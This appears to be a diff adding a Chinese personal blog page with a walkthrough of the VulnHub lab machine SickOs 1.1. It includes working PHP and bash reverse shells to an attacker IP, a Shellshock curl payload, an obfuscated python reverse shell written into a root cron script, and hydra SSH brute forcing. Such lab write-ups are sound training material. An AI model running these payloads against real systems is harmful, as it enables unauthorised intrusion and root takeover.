@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="靶机： sickOs 1.1 1 端口发现sudo nmap 192.168.1.0&#x2F;24 -sn扫描主机192.168.1.104是新出现的，是目标靶机扫描端口开放情况开放了22,3128两个端口，8080扫到了，但是关闭的sudo nmap -p22,3128,8080 -sT -sC -sV -O 192.168.1.104 -oA nmapscan&#x2F;detail 用tcp详细扫描一下再扫描">
+<meta property="og:type" content="article">
+<meta property="og:title" content="靶场实战：sickos 1.1">
+<meta property="og:url" content="https://ta3shi.github.io/2025/06/03/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Asickos%201.1/index.html">
+<meta property="og:site_name" content="ta3shi 个人学习自用">
+<meta property="og:description" content="靶机： sickOs 1.1 1 端口发现sudo nmap 192.168.1.0&#x2F;24 -sn扫描主机192.168.1.104是新出现的，是目标靶机扫描端口开放情况开放了22,3128两个端口，8080扫到了，但是关闭的sudo nmap -p22,3128,8080 -sT -sC -sV -O 192.168.1.104 -oA nmapscan&#x2F;detail 用tcp详细扫描一下再扫描">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1748961685830.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1748961943810.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1748962156462.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1748962212989.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1748961901483.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1748962476652.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1748962880930.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1748963019875.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1748963481965.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1748963650218.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1748964088405.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1748966774218.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749139881017.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749140142121.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749140450031.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749140718477.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749141098361.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1748966914494.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749139119878.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749139354910.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749139422040.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749141236039.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749141692642.png">
+<meta property="article:published_time" content="2025-06-02T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-06-05T16:42:03.548Z">
+<meta property="article:author" content="ta3shi">
+<meta property="article:tag" content="linux提权">
+<meta property="article:tag" content="vulnhub靶场">
+<meta property="article:tag" content="靶场实战">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1748961685830.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>靶场实战：sickos 1.1</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2025/05/07/DeathStar-1/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ta3shi.github.io/2025/06/03/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Asickos%201.1/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ta3shi.github.io/2025/06/03/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Asickos%201.1/&text=靶场实战：sickos 1.1"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ta3shi.github.io/2025/06/03/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Asickos%201.1/&title=靶场实战：sickos 1.1"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ta3shi.github.io/2025/06/03/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Asickos%201.1/&is_video=false&description=靶场实战：sickos 1.1"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=靶场实战：sickos 1.1&body=Check out this article: https://ta3shi.github.io/2025/06/03/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Asickos%201.1/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ta3shi.github.io/2025/06/03/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Asickos%201.1/&title=靶场实战：sickos 1.1"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ta3shi.github.io/2025/06/03/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Asickos%201.1/&title=靶场实战：sickos 1.1"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ta3shi.github.io/2025/06/03/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Asickos%201.1/&title=靶场实战：sickos 1.1"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ta3shi.github.io/2025/06/03/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Asickos%201.1/&title=靶场实战：sickos 1.1"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ta3shi.github.io/2025/06/03/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Asickos%201.1/&name=靶场实战：sickos 1.1&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ta3shi.github.io/2025/06/03/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Asickos%201.1/&t=靶场实战：sickos 1.1"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E7%AB%AF%E5%8F%A3%E5%8F%91%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">1 端口发现</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E7%AB%AF%E5%8F%A3%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">2.端口分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4"><span class="toc-number">3.</span> <span class="toc-text">3.目录爆破</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-web%E6%B8%97%E9%80%8F"><span class="toc-number">4.</span> <span class="toc-text">4.web渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%B3%951-wolfcms%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.1.</span> <span class="toc-text">解法1 wolfcms漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%B3%952-shellshock%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.2.</span> <span class="toc-text">解法2 shellshock漏洞</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">5.</span> <span class="toc-text">权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%951-sudo%E6%8F%90%E6%9D%83"><span class="toc-number">5.1.</span> <span class="toc-text">方法1 sudo提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%952-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%8F%90%E6%9D%83"><span class="toc-number">5.2.</span> <span class="toc-text">方法2 定时任务提权</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        靶场实战：sickos 1.1
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">ta3shi</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-06-02T16:00:00.000Z" class="dt-published" itemprop="datePublished">2025-06-03</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/">靶场实战</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/linux%E6%8F%90%E6%9D%83/" rel="tag">linux提权</a>, <a class="p-category" href="/tags/vulnhub%E9%9D%B6%E5%9C%BA/" rel="tag">vulnhub靶场</a>, <a class="p-category" href="/tags/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/" rel="tag">靶场实战</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>靶机： <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/sickos-11,132/">sickOs 1.1</a></p>
+<h1 id="1-端口发现"><a href="#1-端口发现" class="headerlink" title="1 端口发现"></a>1 端口发现</h1><p><code>sudo nmap 192.168.1.0/24 -sn</code>扫描主机<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1748961685830.png" alt="enter description here"><br>192.168.1.104是新出现的，是目标靶机<br>扫描端口开放情况<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1748961943810.png"><br>开放了22,3128两个端口，8080扫到了，但是关闭的<br><code>sudo nmap -p22,3128,8080 -sT -sC -sV -O 192.168.1.104 -oA nmapscan/detail </code>用tcp详细扫描一下<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1748962156462.png">再扫描一下nmap的默认漏洞脚本看看<code>sudo nmap --script=vuln -p22,3128,8080 192.168.1.104 -oA nmapscan/vuln</code><br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1748962212989.png"><br><code>sudo nmap -sU --top-ports 20 192.168.1.104 -oA nmapscan/udp</code>扫描udp端口开放情况<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1748961901483.png"></p>
+<h1 id="2-端口分析"><a href="#2-端口分析" class="headerlink" title="2.端口分析"></a>2.端口分析</h1><ul>
+<li>22 该端口一般是ssh服务端口，通常在最后才会考虑爆破</li>
+<li>3128 Squid http proxy 3.1.19提示我们是个代理</li>
+<li>8080 也提示我们需要代理<br>我们在浏览器尝试访问，只有3128端口有反应<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1748962476652.png"><br>查询Squid</li>
+</ul>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Squid是一个支持HTTP，HTTPS，FTP等服务的Web缓存代理软件，它可以通过缓存页面来提高[服务器](https://cloud.tencent.com/product/cvm?from_column=20065&amp;from=20065)的相应速度并降低带宽占用。并且，Squid还具有强大的访问控制功能。Squid可以运行在各种操作系统平台上。</span><br><span class="line"></span><br><span class="line">Squid会将访问页面的结果缓存在硬盘和内存上。所以Squid对硬盘和内存的空间大小具有较高的要求。内存和硬盘越大，缓存的命中率就越高。但是真实服务器数据是实时更新的，因此，我们就需要不定期的清空缓存数据以保证用户访问结果的准确性。</span><br></pre></td></tr></table></figure>
+
+<h1 id="3-目录爆破"><a href="#3-目录爆破" class="headerlink" title="3.目录爆破"></a>3.目录爆破</h1><p>尝试对3128端口进行目录爆破<br><code>sudo dirb http://192.168.1.104:3128</code><br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1748962880930.png"><br>没有扫到东西，gobuster也尝试了也是没有东西<br>接着尝试将3128作为代理，看看能不能有所收获<br><code>sudo dirb http://192.168.1.104 -p http://192.168.1.104:3128</code><br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1748963019875.png"><br>这次扫描有东西，说明思路是对的，我们需要将该主机的3128端口作为我们的代理</p>
+<h1 id="4-web渗透"><a href="#4-web渗透" class="headerlink" title="4.web渗透"></a>4.web渗透</h1><h2 id="解法1-wolfcms漏洞"><a href="#解法1-wolfcms漏洞" class="headerlink" title="解法1 wolfcms漏洞"></a>解法1 wolfcms漏洞</h2><p>浏览器设置代理之后我们就可以访问目标靶机了<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1748963481965.png"><br>首先访问robots.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;pre&gt;User-agent: *</span><br><span class="line">Disallow: /</span><br><span class="line">Dissalow: /wolfcms</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>提示访问&#x2F;wolfcms<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1748963650218.png"><br>通常一个cms我们首要是找它的管理页面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**Wolf CMS****是一款内容管理系统（****CMS****），是在****GNUGeneral Public License v3****下发布的免费软件。****Wolf CMS****是由****PHP****语言编写，是****Frog CMS****的一个分支。在****2010****年****Packet Publishing****开源项目评奖的****“Most Promising Open Source Project”****分类中杀进了决赛。**</span><br></pre></td></tr></table></figure>
+<p>通过网络搜索，发现管理员路径有可能是xx&#x2F;wolfcms&#x2F;?&#x2F;admin 尝试之后发现果然是管理员路径<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1748964088405.png"><br>网上查找弱口令，找到admin&#x2F;admin 尝试登录成功<br>里面的文章和主页都可以执行php的代码，这里利用这两个脚本都可以</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">exec</span>(<span class="string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.1.114/5555 0&gt;&amp;1&#x27;&quot;</span>); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$sock</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="string">&quot;192.168.1.114&quot;</span>,<span class="number">443</span>);</span><br><span class="line"><span class="variable">$descriptorspec</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="number">0</span> =&gt; <span class="variable">$sock</span>,</span><br><span class="line">        <span class="number">1</span> =&gt; <span class="variable">$sock</span>,</span><br><span class="line">        <span class="number">2</span> =&gt; <span class="variable">$sock</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$process</span> = <span class="title function_ invoke__">proc_open</span>(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span><br><span class="line"><span class="title function_ invoke__">proc_close</span>(<span class="variable">$process</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1748966774218.png"><br>这里使用第一个脚本成功拿到shell</p>
+<h2 id="解法2-shellshock漏洞"><a href="#解法2-shellshock漏洞" class="headerlink" title="解法2 shellshock漏洞"></a>解法2 shellshock漏洞</h2><p>使用nikto扫描靶机，发现可能存在存在shellshock漏洞<br><code>sudo nikto -h 192.168.1.104 -useproxy http://192.168.1.104:3128</code><br>!<img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749139881017.png">(<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749139679383.png">https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749139679383.png</a>)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GNU Bash 4.3及之前版本在评估某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行Shell命令。某些服务和应用允许未经身份验证的远程攻击者提供环境变量以利用此漏洞。此漏洞源于在调用Bash Shell之前可以用构造的值创建环境变量。这些变量可以包含代码，在Shell被调用后会被立即执行。</span><br></pre></td></tr></table></figure>
+<p>我们可以使用浏览器挂上代理测试，也可以使用curl来，这里选择使用curl<br><code>sudo curl -v http://192.168.1.104/cgi-bin/status --proxy http://192.168.1.104:3128 -H &quot;Referer:() &#123; test;&#125;; echo &#39;Content-Type: text/plain&#39;; echo; echo; /usr/bin/id;exit&quot;</code> 如果该漏洞可用，将返回id的执行结果<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749140142121.png"><br>确认该漏洞存在，尝试获取shell<br>使用msfvenom生成一个bash的反弹shell<code>sudo msfvenom -p cmd/unix/reverse_bash lhost=192.168.1.114 lport=443 -f raw</code><br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749140450031.png"><br>将结果中的<code>0&lt;&amp;38-;exec 38&lt;&gt;/dev/tcp/192.168.1.114/443;sh &lt;&amp;38 &gt;&amp;38 2&gt;&amp;38</code>放到curl中，并监听本地端口<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749140718477.png"><br>连接成功了但是马上就断了，可能是缩写的sh找不到，补充完整路径<br><code>0&lt;&amp;38-;exec 38&lt;&gt;/dev/tcp/192.168.1.114/443;/bin/sh &lt;&amp;38 &gt;&amp;38 2&gt;&amp;38</code><br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749141098361.png"><br>成功拿到shell，使用python获取一个可交互的shell<br><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
+<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="方法1-sudo提权"><a href="#方法1-sudo提权" class="headerlink" title="方法1 sudo提权"></a>方法1 sudo提权</h2><p>读取config.php找到了数据库配置<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1748966914494.png"></p>
+<p>猜测该数据库密码可能是某个ssh用户的密码（感觉该方法有点牵强，但是在实际测试中可以利用）<br>将&#x2F;etc&#x2F;passwd读取出来并存到pass.txt文件，让后用awk将所有可能得用户名读取出来<br><code>cat pass.txt|awk -F &#39;:&#39; &#39;&#123;print $1&#125;&#39; &gt; user.txt</code>将：前当做第一列，存到user.txt文件<br>使用hydra爆破，使用字典文件时用大写，使用确定的字符时用小写<br><code>sudo hydra -L user.txt -p john@123 ssh://ip</code><br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749139119878.png"><br>最后尝试出sickos用户的密码是john@123,ssh登录尝试<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749139354910.png"><br>成功登录，并且sudo拥有全部权限，直接sudo提权即可<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749139422040.png"><br>成功获得root权限并读取flag</p>
+<h2 id="方法2-定时任务提权"><a href="#方法2-定时任务提权" class="headerlink" title="方法2 定时任务提权"></a>方法2 定时任务提权</h2><p>查看定时任务通常查看&#x2F;etc&#x2F;crontab或者&#x2F;etc&#x2F;cron.d下的文件<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749141236039.png"><br>在&#x2F;etc&#x2F;cron.d下发现一个automate文件，打开发现每分钟root会执行一次&#x2F;var&#x2F;www&#x2F;connect.py文件，尝试写一个python的反弹shell脚本到该文件里<br>可以使用<a target="_blank" rel="noopener" href="https://forum.ywhack.com/shell.php">棱角</a>生成一个，也可以用msfvenom生成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ sudo msfvenom -p cmd/unix/reverse_python lhost=192.168.1.104 lport=5555 -f raw</span><br><span class="line">[sudo] password for kali: </span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload</span><br><span class="line">[-] No arch selected, selecting arch: cmd from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 364 bytes</span><br><span class="line">python -c &quot;exec(__import__(&#x27;zlib&#x27;).decompress(__import__(&#x27;base64&#x27;).b64decode(__import__(&#x27;codecs&#x27;).getencoder(&#x27;utf-8&#x27;)(&#x27;eNqVUE0LgkAQ/Suyp12I1ZWKIvYgYRBRQXqX3DaUbGdx1v+fpqB4813m4703M0z5tVA7D0F9tPP+WHkDsMltDUojzghoG4chLwCdJGIfcrHdccFFsCYj2w2XmxZjC2W/jPeBDlV0ys63OJ2f0JPJ/XjJkvQRR1c2mcQVGKOVo7S7YmbtVrOJGpC/GhtS5O+y0gYomxmCJWKxRBxOxFaOb+XqWVWU+HlpfCwI+wGHW2Bn&#x27;)[0])))&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><code>echo &quot;exec(__import__(&#39;zlib&#39;).decompress(__import__(&#39;base64&#39;).b64decode(__import__(&#39;codecs&#39;).getencoder(&#39;utf-8&#39;)(&#39;eNqVUE0LgkAQ/Suyp12I1ZWKIvYgYRBRQXqX3DaUbGdx1v+fpqB4813m4703M0z5tVA7D0F9tPP+WHkDsMltDUojzghoG4chLwCdJGIfcrHdccFFsCYj2w2XmxZjC2W/jPeBDlV0ys63OJ2f0JPJ/XjJkvQRR1c2mcQVGKOVo7S7YmbtVrOJGpC/GhtS5O+y0gYomxmCJWKxRBxOxFaOb+XqWVWU+HlpfCwI+wGHW2Bn&#39;)[0])))&quot; &gt;&gt; connect.py</code><br>监听本地5555端口即可<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1749141692642.png"><br>成功拿到root</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/tags/">Tags</a></li>
+        
+          <li><a href="/categories/">Categories</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E7%AB%AF%E5%8F%A3%E5%8F%91%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">1 端口发现</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E7%AB%AF%E5%8F%A3%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">2.端口分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4"><span class="toc-number">3.</span> <span class="toc-text">3.目录爆破</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-web%E6%B8%97%E9%80%8F"><span class="toc-number">4.</span> <span class="toc-text">4.web渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%B3%951-wolfcms%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.1.</span> <span class="toc-text">解法1 wolfcms漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%B3%952-shellshock%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.2.</span> <span class="toc-text">解法2 shellshock漏洞</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">5.</span> <span class="toc-text">权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%951-sudo%E6%8F%90%E6%9D%83"><span class="toc-number">5.1.</span> <span class="toc-text">方法1 sudo提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%952-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%8F%90%E6%9D%83"><span class="toc-number">5.2.</span> <span class="toc-text">方法2 定时任务提权</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ta3shi.github.io/2025/06/03/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Asickos%201.1/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
